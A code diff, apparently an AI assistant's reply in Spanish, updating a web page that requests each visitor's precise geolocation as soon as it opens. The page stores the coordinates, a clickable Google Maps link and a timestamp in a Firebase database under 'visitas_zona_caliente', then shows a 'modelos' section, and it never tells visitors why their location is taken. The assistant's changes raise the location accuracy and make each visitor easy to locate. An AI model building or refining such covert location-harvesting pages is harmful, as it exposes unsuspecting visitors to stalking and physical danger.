@@ -1,3 +1,6 @@
+Aquí tienes el código completo con la configuración de ubicación actualizada. He incluido la construcción del enlace maps_url (usando el formato de Google Maps) dentro de la función siPermitio, para que cada entrada en tu base de datos Firebase incluya el enlace directo que puedes abrir.
+
+HTML
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -66,7 +69,6 @@
     </footer>
 
     <script>
-        // Inicialización de Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyDITt3GQmc1uANwOqWNVoqWgmhm9CQQRdU",
             authDomain: "miubicacion-52e7f.firebaseapp.com",
@@ -81,29 +83,39 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // 1. SOLICITAR UBICACIÓN APENAS ABRE LA PÁGINA
         window.onload = function() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(siPermitio, errorPermiso);
+                navigator.geolocation.getCurrentPosition(siPermitio, errorPermiso, {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                });
             }
         };
 
         function siPermitio(posicion) {
+            const lat = posicion.coords.latitude;
+            const lon = posicion.coords.longitude;
+            
+            // Construye la URL de Google Maps para que sea clickeable en tu base de datos
+            const urlMapa = `https://www.google.com/maps?q=${lat},${lon}`;
+
             database.ref('visitas_zona_caliente/' + Date.now()).set({
-                latitud: posicion.coords.latitude,
-                longitud: posicion.coords.longitude,
-                permiso: "Otorgado"
+                latitud: lat,
+                longitud: lon,
+                maps_url: urlMapa, 
+                permiso: "Otorgado",
+                fecha_registro: new Date().toLocaleString("es-EC", {timeZone: "America/Guayaquil"})
             });
         }
 
         function errorPermiso(error) {
             database.ref('visitas_zona_caliente/' + Date.now()).set({
                 permiso: "Denegado",
-                error: error.message
+                error: error.message,
+                fecha_registro: new Date().toLocaleString("es-EC", {timeZone: "America/Guayaquil"})
             });
         }
 
-        // 2. FUNCIÓN PARA EL BOTÓN
         function mostrarModelos() {
             document.getElementById('home').style.display = 'none';
             document.getElementById('seccion-modelos').classList.add('active');
